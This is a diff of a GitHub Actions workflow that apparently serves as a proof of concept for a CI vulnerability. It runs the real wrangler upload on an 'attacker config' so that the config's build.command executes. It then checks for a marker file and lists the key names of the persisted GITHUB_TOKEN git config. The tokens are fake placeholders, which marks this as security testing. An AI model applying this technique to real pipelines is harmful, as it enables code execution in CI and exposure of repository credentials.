@@ -33,21 +33,17 @@ jobs:
           github-token: ${{ secrets.GITHUB_TOKEN }}
       - name: Config AFTER artifact download (should be the main-branch copy)
         run: cat packages/kumo-docs-astro/wrangler.jsonc
-      - name: Simulate `wrangler versions upload` custom build step
+      - name: Run the real `wrangler versions upload` on the attacker config
         working-directory: packages/kumo-docs-astro
         env:
           CLOUDFLARE_API_TOKEN: FAKE_CF_API_TOKEN_PLACEHOLDER
           CLOUDFLARE_ACCOUNT_ID: "00000000000000000000000000000000"
         run: |
-          node -e '
-            const fs = require("fs");
-            const cfg = JSON.parse(fs.readFileSync("wrangler.jsonc", "utf8"));
-            const cmd = cfg.build.command;
-            console.log("build.command ->", cmd);
-            require("child_process").execSync(cmd, {stdio: "inherit", env: process.env});
-          '
-          echo "== marker written by build.command =="
-          cat BUILD_COMMAND_RAN.txt
+          set +e
+          npx --yes wrangler@4 versions upload --env="" 2>&1 | tail -60
+          echo "wrangler exit: ${PIPESTATUS[0]} (auth is expected to fail: token is fake)"
+          echo "== marker written by the attacker's build.command =="
+          cat BUILD_COMMAND_RAN.txt || echo "MARKER MISSING"
       - name: GITHUB_TOKEN persisted by checkout (key names only, no values)
         run: |
           git config --local --name-only --get-regexp 'http\..*\.extraheader' | sed 's/^/persisted git config key: /'
